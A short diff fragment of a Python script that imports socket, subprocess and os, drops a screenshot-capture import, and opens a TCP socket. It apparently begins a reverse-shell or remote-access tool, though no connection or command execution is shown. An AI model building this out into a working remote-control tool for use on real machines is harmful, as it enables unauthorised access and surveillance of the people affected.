@@ -1,7 +1,6 @@
 import socket
 import subprocess
 import os
-from PIL import ImageGrab
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
